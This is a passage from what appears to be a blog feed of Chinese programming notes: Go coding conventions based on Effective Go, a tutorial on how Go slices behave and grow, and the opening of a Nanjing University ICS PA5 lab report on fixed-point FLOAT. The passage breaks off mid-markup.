    <content type="html"><![CDATA[<h1 id="go编码规范">Go编码规范</h1><p>最近正在阅读<code>Effective C++</code>和<code>Effective Modern C++</code>，其中的很多条款都值得反复阅读并牢记，理解其中的原理对用好C++这把瑞士军刀受益匪浅。相应的，最近也发现了<a href="https://go.dev/doc/effective_go"><code>Effective go</code></a>，就如何编写清晰、地道的Go 代码提供了一些技巧。它是对 <a href="https://go-zh.org/ref/spec">语言规范</a>、 <a href="https://tour.golang.org/">Go 语言之旅</a> 以及 <a href="https://go-zh.org/doc/code.html">如何使用 Go 编程</a>的补充说明。得益于Go的简洁，其编程规范比C++要简洁清晰很多。结合Go的官方指导以及实践，对高质量编程的一些方面进行了总结。</p><h2 id="高质量编程简介">高质量编程简介</h2><p>实现同样的功能，可能大到编程范式，小到实现细节，有很多种编码的风格和方式供我们选择。编写的代码能够达到正确可靠、简洁清晰的目标需要我们不断的在实践中修炼。不管是面试还是在实际的项目开发中，都需要我们对高质量的代码有所追求。</p><p>在课件中提到的三个主要的判断维度：</p><ul><li>各种边界条件是否考虑完备</li><li>异常情况处理，稳定性保证</li><li>易读易维护</li></ul><p>编程原则：</p><ul><li>简单性</li><li>可读性</li><li>团队生产力</li></ul><p>前面两点原则容易理解，关于最后一点，因为我们编程其实更重要的是一个团队合作的一个过程，团队的整体工作效率也是非常重要的。比如字节内部采用Go语言，其实最有特点的一点就是，Go语言的简洁性对于降低新成员上手项目代码成本很有帮助。</p><p>在实际的工程项目当中，如果有一些复杂的一些程序逻辑，其他人基本上就不太敢动，尤其是有一些历史的一些逻辑的话，写得比较复杂，可能又难以理解，新接手的人就没办法明确的知道我们这些调整会造成的影响的一些范围，可能会产生什么样的问题。这样的话就会让代码变得难以维护。这些难以维护的这些逻辑在排查问题的时候也会带来不少麻烦。而如果我们的代码比较清晰的话，那么就算出现了一些问题，我们也能通过现象，或者代码逻辑，快速分析排查定位到这些问题。能够提升整体的整个项目开发环节的效率。所以说在写代码时考虑对于团队生产力带来的影响，也是高质量编程原则给我们带来的好的习惯。</p><h2 id="编码规范">编码规范</h2><p>如何编写高质量 Go 代码</p><h3 id="代码格式">代码格式</h3><p>格式化问题总是充满了争议，但却始终没有形成统一的定论。虽说人们可以适应不同的编码风格，但抛弃这种适应过程岂不更好？<strong>若所有人都遵循相同的编码风格，在这类问题上浪费的时间将会更少</strong>。问题就在于如何实现这种设想，而无需冗长的语言风格规范。</p><p>在 Go中我们另辟蹊径，<strong>让机器来处理大部分的格式化问题</strong>。<code>gofmt</code>程序（也可用 <code>go fmt</code>，它以包为处理对象而非源文件）将 Go程序按照标准风格缩进、 对齐，保留注释并在需要时重新格式化。</p><h3 id="注释">注释</h3><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-70lo3qlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-70lo3qlluxp18z"><pre><code class="hljs go">Good code has lots of comments, bad code requires lots of comments好的代码有很多注释，坏代码需要很多注释          ---Dave Thomas and Andrew Hunt</code></pre></div></div><ul><li><p>注释需要解释代码实现的原因。</p><p>适合解释代码的外部因素</p><p>提供额外上下文</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zhvdeglluxp18z"></i><span>go</span><div class="collapse show" id="collapse-zhvdeglluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> resp.StatusCode {<span class="hljs-comment">// ...</span><span class="hljs-keyword">case</span> <span class="hljs-number">307</span>, <span class="hljs-number">308</span>:redirectMethod = reqMethod shouldRedirect = <span class="hljs-literal">true</span> includeBody = <span class="hljs-literal">true</span> <span class="hljs-keyword">if</span> ireq.GetBody == <span class="hljs-literal">nil</span> &amp;&amp; ireq.outgoingLength() != <span class="hljs-number">0</span> {  <span class="hljs-comment">// We had a request body, and 307/308 require</span>  <span class="hljs-comment">// re-sending it, but GetBody is not defined. So just</span>  <span class="hljs-comment">// return this response to the user instead of an</span>  <span class="hljs-comment">// error, like we did in Go 1.7 and earlier.</span>  shouldRedirect = <span class="hljs-literal">false</span> }}</code></pre></div></div></li><li><p><strong>注释应该解释代码什么情况会出错</strong></p><p>在调用方在使用这个方法的时候，可能它不需要实际的去特别细究里面的代码，d但是注释有必要提供需要注意的点，在用户或者自己使用的时候，如果是注意到相关这些点的话，它就能够更正确的来处理相关的一些结果。</p></li><li><p>公共符号始终要注释。对于公共符号都需要有注释说明</p></li><li><p>注释最好是<strong>完整的句子</strong>，这样它才能适应各种自动化的展示。</p><p>第一句应当以<strong>被声明的东西开头</strong>，并且是<strong>单句的摘要</strong>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gnwwerlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-gnwwerlluxp18z"><pre><code class="hljs go"><span class="hljs-comment">// Compile parses a regular expression and returns, if successful,</span><span class="hljs-comment">// a Regexp that can be used to match against text.</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Compile</span><span class="hljs-params">(str <span class="hljs-type">string</span>)</span></span> (*Regexp, <span class="hljs-type">error</span>) {</code></pre></div></div><p>若注释总是以名称开头，<code>go doc</code> 命令的输出就能通过<strong>grep</strong> 变得更加有用。假如你记不住 Compile这个名称，而又在找正则表达式的解析函数（”解析”意味着关键词为parse），那就可以运行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gezjballuxp18z"></i><span>shell</span><div class="collapse show" id="collapse-gezjballuxp18z"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">go doc -all regexp | grep -i parse</span></code></pre></div></div><p>快速查找。</p></li></ul><h3 id="命名">命名</h3><h4 id="变量">变量</h4><p>Go约定使用驼峰命名，而不是下划线。其他一些通用的命名原则：</p><ul><li>简洁胜于冗长</li><li>缩略词全大写，但当其位于变量开头且不需要导出时，使用全小写<ul><li>例如使用 <code>ServeHTTP</code> 而不是 <code>ServeHttp</code></li><li>使用 <code>XMLHTTPRequest</code> 或者<code>xmlHTTPRequest</code></li></ul></li><li>变量距离其被使用的地方越远，则需要携带越多的上下文信息。全局变量在其名字中需要更多的上下文信息，使得在不同地方可以轻易辨认出其含义</li></ul><h4 id="接口">接口</h4><p>按照约定，<strong>只包含一个方法的接口</strong>应当以该方法的名称加上<code>-er</code> 后缀来命名，如<code>Reader</code>、<code>Writer</code>、<code>Formatter</code>、<code>CloseNotifier</code>等。</p><p>诸如此类的命名有很多，遵循它们及其代表的函数名会让事情变得简单。Read、Write、Close、Flush、String等都具有典型的签名和意义。为避免冲突，请不要用这些名称为你的方法命名，除非你明确知道它们的签名和意义相同。反之，若你的类型实现了的方法，<strong>与一个众所周知的类型的方法拥有相同的含义，那就使用相同的命名</strong>。请将字符串转换方法命名为<code>String</code> 而非 <code>ToString</code>。</p><h4 id="函数">函数</h4><ul><li>函数名不携带包名的上下文信息，因为包名和函数名总是成对出现的</li><li>函数名尽量简短</li><li>当名为 foo 的包某个函数返回类型 Foo时，可以省略类型信息而不导致歧义</li><li>当名为 foo 的包某个函数返回类型 T 时（T 并不是Foo），可以在函数名中加入类型信息</li></ul><h4 id="包名">包名</h4><ul><li>只由小写字母组成。不包含大写字母和下划线等字符</li><li>简短并包含一定的上下文信息。例如 schema、task 等</li><li>不要与标准库同名。例如不要使用 sync 或者 strings</li></ul><p>一个约定就是<strong>包名应为其源码目录的基本名称</strong>。在<code>src/pkg/encoding/base64</code> 中的包应作为<code>"encoding/base64"</code> 导入，其包名应为<code>base64</code>，而非 <code>encoding_base64</code> 或<code>encodingBase64</code>。</p><p>包的导入者可通过包名来引用其内容，因此包中的可导出名称可以此来避免冲突。（请勿使用<code>import .</code>记法，它可以简化必须在被测试包外运行的测试，除此之外应尽量避免使用。这个原则在其他语言中也是通用的。）例如，<code>bufio</code>包中的缓存读取器类型叫做 <code>Reader</code> 而非<code>BufReader</code>，因为用户将它看做<code>bufio.Reader</code>，这是个清楚而简洁的名称。此外，由于被导入的项总是通过它们的包名来确定，因此<code>bufio.Reader</code> 不会与 <code>io.Reader</code>发生冲突。同样，用于创建 <code>ring.Ring</code> 的新实例的函数（这就是Go 中的构造函数）一般会称之为 <code>NewRing</code>，但由于 Ring是该包所导出的唯一类型，且该包也叫 ring，因此它可以只叫做<code>New</code>，它跟在包的后面，就像<code>ring.New</code>。使用包结构可以帮助你选择好的名称。</p><p>另一个简短的例子是 <code>once.Do</code>，<code>once.Do(setup)</code>表述足够清晰，使用 <code>once.DoOrWaitUntilDone(setup)</code>完全就是画蛇添足。<strong>长命名并不会使其更具可读性。一份有用的说明文档通常比额外的长名更有价值</strong>。</p><h3 id="控制流程">控制流程</h3><p>关于控制流程，和其他语言类似，避免嵌套，保持正常流程清晰。遵循线性原理，处理逻辑尽量走直线，避免复杂的嵌套分支。正常流程代码沿着屏幕向下移动先处理异常情况并return掉是个好习惯，可以减少嵌套的同时提高对异常处理的意识，后续产生可能出现的新的异常时也便于修改。</p><h3 id="错误与异常处理">错误与异常处理</h3><p>在工程实践中，错误和异常处理大概是最重要的部分。Go语言的异常处理和其他主流编程语言风格相差较大，既有<code>defer</code>这种优雅的压栈处理回调行为，以便正确管理资源的支持，也有喜闻乐见的<code>if err!=nil</code>。下面对Golang的错误处理进行更深入的认识。</p><h4 id="简单错误">简单错误</h4><p>简单错误指仅出现一次的错误，且在其他地方不需要捕获该错误</p><p>优先使用 errors.New 创建匿名变量来直接表示简单错误</p><p>如果有格式化的需求，使用<code>fmt.Error</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tg24vtlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-tg24vtlluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">defaultCheckRedirect</span><span class="hljs-params">(req *Request, via []*Request)</span></span> <span class="hljs-type">error</span> {<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(via) &gt;= <span class="hljs-number">10</span> {<span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">"stopped after 10 redirects"</span>)}<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>}</code></pre></div></div><h4 id="错误的-wrap-和-unwrap">错误的 Wrap 和 Unwrap</h4><p>将一个 error 嵌套进另一个 error 中，从而生成一个 error 的跟踪链</p><p>从 Go1.13 后，可以在 <code>fmt.Errorf</code> 中使用 <code>%w</code>关键字来将一个错误 wrap 至其错误链中</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-apjmqtlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-apjmqtlluxp18z"><pre><code class="hljs go">list, _, err := c.GetBytes(cache.Subkey(a.actionID, <span class="hljs-string">"srcfiles"</span>))<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">"reading srcfiles list: %w"</span>, err)}</code></pre></div></div><h4 id="错误判定">错误判定</h4><ul><li>使用 <code>errors.Is</code>可以判定错误链上的所有错误是否含有特定的错误</li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-z3ag9klluxp18z"></i><span>go</span><div class="collapse show" id="collapse-z3ag9klluxp18z"><pre><code class="hljs go">data, err = lockedfile.Read(targ)<span class="hljs-keyword">if</span> errors.Is(err, fs.ErrNotExist) {<span class="hljs-comment">// Treat non-existent as empty, to bootstrap the "latest" file</span><span class="hljs-comment">// the first time we connect to a given database.</span><span class="hljs-keyword">return</span> []<span class="hljs-type">byte</span>{}, <span class="hljs-literal">nil</span>}</code></pre></div></div><ul><li>在错误链上获取特定种类的错误，使用 <code>errors.As</code></li></ul><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s8mgixlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-s8mgixlluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">if</span> _, err := os.Open(<span class="hljs-string">"non-existing"</span>); err != <span class="hljs-literal">nil</span> {<span class="hljs-keyword">var</span> pathError *fs.PathError<span class="hljs-keyword">if</span> errors.As(err, &amp;pathError) {fmt.Println(<span class="hljs-string">"Failed at path:"</span>, pathError.Path)} <span class="hljs-keyword">else</span> {fmt.Println(err)}}</code></pre></div></div><h4 id="panic">panic</h4><ul><li>不建议在业务代码中使用panic，若问题可以被屏蔽或解决，最好就是让程序继续运行而不是终止整个程序。</li><li>如果当前 goroutine 中所有 deferred 函数都不包含 recover就会造成整个程序崩溃</li><li>当程序启动阶段发生不可逆转的错误时，可以在 init 或 main 函数中使用panic</li></ul><h4 id="recover">recover</h4><ul><li>recover 只能在被 defer 的函数中使用，嵌套无法生效，只在当前goroutine 生效</li><li>如果需要更多的上下文信息，可以 recover 后在 log中记录当前的调用栈。</li></ul><h3 id="总结">总结</h3><p>上述内容仅是个人结合最近的学习内容和EffectiveGo总结出的自己认为较重要的部分记录，以便回顾和提醒。深入掌握一门语言还是要靠阅读第一手材料和动手实践。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 语言入门指南：slice使用解析</title>
    <link href="/posts/29701/"/>
    <url>/posts/29701/</url>
    
    <content type="html"><![CDATA[<h1 id="go-语言入门指南slice使用解析">Go语言入门指南：slice使用解析</h1><p>在讲slice使用之前，先来看一下切片的结构,理解slice的底层存储对得心应手的使用slice来说是必须的。切片的数据结构是一个结构体,结构体内有三个参数, pointer指向底层数组中的某个元素, length表示长度,cap表示最大容量。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8gservlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-8gservlluxp18z"><pre><code class="hljs go"><span class="hljs-keyword">type</span> slice <span class="hljs-keyword">struct</span> {    array unsafe.Pointer  <span class="hljs-comment">//底层数组</span>    <span class="hljs-built_in">len</span>   <span class="hljs-type">int</span>   <span class="hljs-comment">//长度</span>    <span class="hljs-built_in">cap</span>   <span class="hljs-type">int</span>   <span class="hljs-comment">//容量</span>}</code></pre></div></div><p>此部分源码位于<a href="https://go.dev/src/runtime/slice.go"><code>src/runtime/slice.go</code></a>。</p><h3 id="空切片和nil切片">空切片和nil切片</h3><p>在开发中我们会经常遇到这种情况, 我们想返回长度为零的切片时,有时返回的是nil, 有时返回的是空切片, 这两者有什么区别呢,我们到底应该使用哪一种呢。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uywf4flluxp18z"></i><span>go</span><div class="collapse show" id="collapse-uywf4flluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {    <span class="hljs-comment">// 定义nil切片</span>    <span class="hljs-keyword">var</span> s1 []<span class="hljs-type">string</span>    <span class="hljs-comment">//定义空切片</span>    s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>)    s3 := []<span class="hljs-type">string</span>{}    fmt.Printf(<span class="hljs-string">"%#v,Len:%d,cap:%d,ptr:%p,nil=%t\n"</span>, s1, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1), s1, <span class="hljs-literal">nil</span> == s1)    fmt.Printf(<span class="hljs-string">"%#v,Len:%d,cap:%d,ptr:%p,nil=%t\n"</span>, s2, <span class="hljs-built_in">len</span>(s2), <span class="hljs-built_in">cap</span>(s2), s2, <span class="hljs-literal">nil</span> == s2)    fmt.Printf(<span class="hljs-string">"%#v,Len:%d,cap:%d,ptr:%p,nil=%t\n"</span>, s3, <span class="hljs-built_in">len</span>(s3), <span class="hljs-built_in">cap</span>(s3), s3, <span class="hljs-literal">nil</span> == s3)}</code></pre></div></div><p>打印结果：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lcwj0slluxp18z"></i><span>go</span><div class="collapse show" id="collapse-lcwj0slluxp18z"><pre><code class="hljs go">[]<span class="hljs-type">string</span>(<span class="hljs-literal">nil</span>),Len:<span class="hljs-number">0</span>,<span class="hljs-built_in">cap</span>:<span class="hljs-number">0</span>,ptr:<span class="hljs-number">0x0</span>,<span class="hljs-literal">nil</span>=<span class="hljs-literal">true</span>[]<span class="hljs-type">string</span>{},Len:<span class="hljs-number">0</span>,<span class="hljs-built_in">cap</span>:<span class="hljs-number">0</span>,ptr:<span class="hljs-number">0x10438c108</span>,<span class="hljs-literal">nil</span>=<span class="hljs-literal">false</span>[]<span class="hljs-type">string</span>{},Len:<span class="hljs-number">0</span>,<span class="hljs-built_in">cap</span>:<span class="hljs-number">0</span>,ptr:<span class="hljs-number">0x10438c108</span>,<span class="hljs-literal">nil</span>=<span class="hljs-literal">false</span></code></pre></div></div><p>现在分别打印这三个切片, 可以发现长度容量相同且都为零,那两者有什么不同呢。</p><p>第一点切片的指针指向不同。<code>nil</code>切片通过<code>var</code>关键词定义,仅声明未初始化<code>pointer</code>指针为<code>nil</code>空指针,空切片通过<code>make</code>关键词定义声明并初始化了空间,由于初始化的长度为零, <code>pointer</code>指针指向了空结构体的地址,还未指向底层数组。</p><p>第二点是否等于<code>nil</code>。这个是显然的。但这也说明判断一个切片是否为空时,我们应该通过长度是否为零来判断, 而不是通过是否为nil而来判断。</p><p>第三点, 转码<code>json</code>后不同。对切片进行<code>json</code>编码,<code>nil</code>切片会被编码成当空,切片会被编码成空数组。这一点在前后端交互时值得注意。</p><p><code>make</code>参数第一个是数据类型，第二个是 len ，第三个是 cap。如果不传入第三个参数，则 <code>cap=len</code>。</p><h3 id="slice传递">slice传递</h3><p>下面看一段代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wvseaylluxp18z"></i><span>go</span><div class="collapse show" id="collapse-wvseaylluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<span class="hljs-keyword">var</span> s []<span class="hljs-type">int</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ {s = <span class="hljs-built_in">append</span>(s, i)}modifySlice(s)fmt.Println(s)}</code></pre></div></div><p>一眼就能看出来，肯定是打印[1024,1,2,2048]吧。其实不是，运行这段代码后只会打印出[1024,1,2]。原因就是slice是按值传递的，这里传递的是s底层的数组的指针。</p><p>但是仅仅是共享了slice底层的数组，slice底层的<code>len</code>和<code>cap</code>都是被复制了一份，所以在<code>modifySlice</code>里面的<code>len+1</code>在外层是看不到的。外层的<code>len</code>还是3。</p><p>更进一步，如果我们再append一条数据会怎么样呢？</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-538ipnlluxp18z"></i><span>go</span><div class="collapse show" id="collapse-538ipnlluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">modifySlice</span><span class="hljs-params">(s []<span class="hljs-type">int</span>)</span></span> {s = <span class="hljs-built_in">append</span>(s, <span class="hljs-number">2048</span>)s = <span class="hljs-built_in">append</span>(s, <span class="hljs-number">4096</span>)s[<span class="hljs-number">0</span>] = <span class="hljs-number">1024</span>}</code></pre></div></div><p>我们可以看到外层打印的slice变成了<strong>[0,1,2]</strong>。因为modifySlice函数内的slice底层的数组发生了扩容，变成了另一个扩容后的结构体，但是外层的slice还是引用的老的结构体。</p><p>由此我们得出： slice 还有array 都按值传递的(传递的时候会复制内存)，golang里所有数据都是按值传递的，指针也是值的一种</p><p>如果没有发生扩容，修改在原来的底层数组内存中</p><p>如果发生了扩容，修改会在新的内存中</p><p>显然，这会发生我们意料之外的行为。因此我们应当使用指针传递作为函数的参数，这与C语言类似。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h4kb6ulluxp18z"></i><span>go</span><div class="collapse show" id="collapse-h4kb6ulluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">modifySlice2</span><span class="hljs-params">(s *[]<span class="hljs-type">int</span>)</span></span> {*s = <span class="hljs-built_in">append</span>(*s, <span class="hljs-number">2048</span>)(*s)[<span class="hljs-number">0</span>] = <span class="hljs-number">1024</span>}</code></pre></div></div><p>相应的，调用方式为<code>modifySlice(&amp;s)</code>。</p><h3 id="扩容策略">扩容策略</h3><p>当一次向slice中添加大于原slice容量两倍的元素时，直接将新长度作为容量。否则，</p><p>1.当cap &lt; 256 的时候 slice 每次扩容 * 2。</p><p>2.当cap &gt;= 256 的时候， slice每次扩容 * 1.25。</p><p>我们可以查看<a href="https://go.dev/src/runtime/slice.go">源码</a>中<code>growslice</code>的实现具体分析，这里摘录其核心部分：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nj8w8olluxp18z"></i><span>go</span><div class="collapse show" id="collapse-nj8w8olluxp18z"><pre><code class="hljs go"><span class="hljs-comment">//num = number of elements being added</span><span class="hljs-comment">//newLen = current length (= oldLen + num)</span>oldLen := newLen - numnewcap := oldCapdoublecap := newcap + newcap<span class="hljs-keyword">if</span> newLen &gt; doublecap {newcap = newLen} <span class="hljs-keyword">else</span> {<span class="hljs-keyword">const</span> threshold = <span class="hljs-number">256</span><span class="hljs-keyword">if</span> oldCap &lt; threshold {newcap = doublecap} <span class="hljs-keyword">else</span> {<span class="hljs-comment">// Check 0 &lt; newcap to detect overflow</span><span class="hljs-comment">// and prevent an infinite loop.</span><span class="hljs-keyword">for</span> <span class="hljs-number">0</span> &lt; newcap &amp;&amp; newcap &lt; newLen {<span class="hljs-comment">// Transition from growing 2x for small slices</span><span class="hljs-comment">// to growing 1.25x for large slices. This formula</span><span class="hljs-comment">// gives a smooth-ish transition between the two.</span>newcap += (newcap + <span class="hljs-number">3</span>*threshold) / <span class="hljs-number">4</span>}<span class="hljs-comment">// Set newcap to the requested cap when</span><span class="hljs-comment">// the newcap calculation overflowed.</span><span class="hljs-keyword">if</span> newcap &lt;= <span class="hljs-number">0</span> {newcap = newLen}}}</code></pre></div></div><p>在<code>make</code>slice时预先分配内存可以提升性能，避免重复的扩容导致性能损失。</p><h3 id="切片操作">切片操作</h3><h4 id="原理">原理</h4><p>切片操作并不复制切片指向的元素，创建一个新的切片会复用原来切片的底层数组，因此切片操作是非常高效的。</p><p>看下面的例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wsdt1klluxp18z"></i><span>go</span><div class="collapse show" id="collapse-wsdt1klluxp18z"><pre><code class="hljs go">nums := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>)nums = <span class="hljs-built_in">append</span>(nums, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)nums2 := nums[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]printLenCap(nums)  <span class="hljs-comment">// len: 5, cap: 8 [1 2 3 4 5]</span>printLenCap(nums2) <span class="hljs-comment">// len: 2, cap: 6 [3 4]</span>nums2 = <span class="hljs-built_in">append</span>(nums2, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>)printLenCap(nums)  <span class="hljs-comment">// len: 5, cap: 8 [1 2 3 4 50]</span>printLenCap(nums2) <span class="hljs-comment">// len: 4, cap: 6 [3 4 50 60]</span></code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Go%20%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%EF%BC%9Aslice%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90/20230828210826094432_897_20230821221521427663_524_slice.jpg" alt="slice"><figcaption aria-hidden="true">slice</figcaption></figure><ul><li>nums2 执行了一个切片操作 <code>[2, 4)</code>，此时 nums 和 nums2指向的是同一个数组。</li><li>nums2 增加 2 个元素 50 和 60 后，将底层数组下标 [4] 的值改为了50，下标[5] 的值置为 60。</li><li>因为 nums 和 nums2 指向的是同一个数组，因此 nums 被修改为 [1, 2, 3,4, 50]。</li></ul><h4 id="性能陷阱">性能陷阱</h4><p>切片的底层是数组，因此在某处插入元素或删除元素意味着后面的元素需要逐个向后或向前移位。每次删除的复杂度为O(N)，因此切片不合适大量随机删除的场景，这种场景下适合使用链表。</p><p>另外在<code>slice传递</code>一节中提到，在已有切片的基础上进行切片，不会创建新的底层数组。因为原来的底层数组没有发生变化，内存会一直占用，直到没有变量引用该数组。因此很可能出现这么一种情况，原切片由大量的元素构成，但是我们在原切片的基础上切片，虽然只使用了很小一段，但底层数组在内存中仍然占据了大量空间，得不到释放。比较推荐的做法是使用<code>copy</code> 替代 <code>re-slice</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rt0yxslluxp18z"></i><span>go</span><div class="collapse show" id="collapse-rt0yxslluxp18z"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lastNumsBySlice</span><span class="hljs-params">(origin []<span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">int</span> {<span class="hljs-keyword">return</span> origin[<span class="hljs-built_in">len</span>(origin)<span class="hljs-number">-2</span>:]}<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lastNumsByCopy</span><span class="hljs-params">(origin []<span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">int</span> {result := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<span class="hljs-built_in">copy</span>(result, origin[<span class="hljs-built_in">len</span>(origin)<span class="hljs-number">-2</span>:])<span class="hljs-keyword">return</span> result}</code></pre></div></div><h3 id="总结">总结</h3><p>相比C++和Java中的线性容器，golang的切片使用起来更加灵活，但使用时也有更多需要注意的地方。同时，很多常见的数据结构需要我们自己去定义封装，而不像其他语言一样语法层面或标准库层面做了很多实现和封装。关于这一方面的知识会在后续的文章中继续分享。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA5</title>
    <link href="/posts/27788/"/>
    <url>/posts/27788/</url>
    
    <content type="html"><![CDATA[<h1 id="pa5实验报告">PA5实验报告</h1><p>2013599 田佳业</p><h2 id="实现浮点指令">实现浮点指令</h2><p>先看一下目前进入战斗场面是什么情况。这里有一个问题是怎么进入战斗场面。因为现在仙剑奇侠传跑的比较慢，这一步都费了挺长时间(笑)</p><p>首先进入主界面选旧的回忆，读最后一个档(倒数第二个档试过没有怪)，进去走迷宫，上下左右移动，走一会儿遇到怪物，自动进入战斗场景。往右下角走会快一些。<del>怪物画的好涩</del></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210311800040_251_20230601235912474020_401_image-20230601104023742.png" alt="image-20230601104023742"><figcaption aria-hidden="true">image-20230601104023742</figcaption></figure><p>按照指导书，修改<code>navy-apps/apps/pal/src/FLOAT/FLOAT.c</code>和对应的头文件。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210313128796_270_20230601235917144417_751_image-20230601111018328.png" alt="image-20230601111018328"><figcaption aria-hidden="true">image-20230601111018328</figcaption></figure><p>根据讲义:</p><blockquote><p>我们先来说明如何用一个32位整数来表示一个实数. 为了方便叙述,我们称用binary scaling方法表示的实数的类型为<code>FLOAT</code>.我们约定最高位为符号位, 接下来的15位表示整数部分, 低16位表示小数部分,即约定小数点在第15和第16位之间(从第0位开始). 从这个约定可以看到,<code>FLOAT</code>类型其实是实数的一种定点表示.</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-76t642lluwpkzu"></i><span>asciidoc</span><div class="collapse show" id="collapse-76t642lluwpkzu"><pre><code class="hljs asciidoc"><span class="hljs-section">31  30                  16                    0</span><span class="hljs-section">+----+-------------------+--------------------+</span><span class="hljs-section">|sign|      integer      |      fraction      |</span><span class="hljs-section">+----+-------------------+--------------------+</span></code></pre></div></div></blockquote><p>相应的，IEEE754的标准，<a href="https://blog.csdn.net/gao_zhennan/article/details/120717424">图源</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210314320862_982_20230601235920917333_702_image-20230601112028613.png" alt="image-20230601112028613"><figcaption aria-hidden="true">image-20230601112028613</figcaption></figure><p>这一部分有点像CSAPP的DataLab，但是由于使用定点表示实数的场景越来越少，这一部分实际价值也并不大。可以看到后面版本的PA已经将这一部分去除。</p><h3 id="浮点转定点">浮点转定点</h3><p>先考虑浮点转定点。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA5/20230828210315373336_905_20230601235924396067_218_image-20230601153308456.png" alt="image-20230601153308456"><figcaption aria-hidden="true">image-20230601153308456</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" 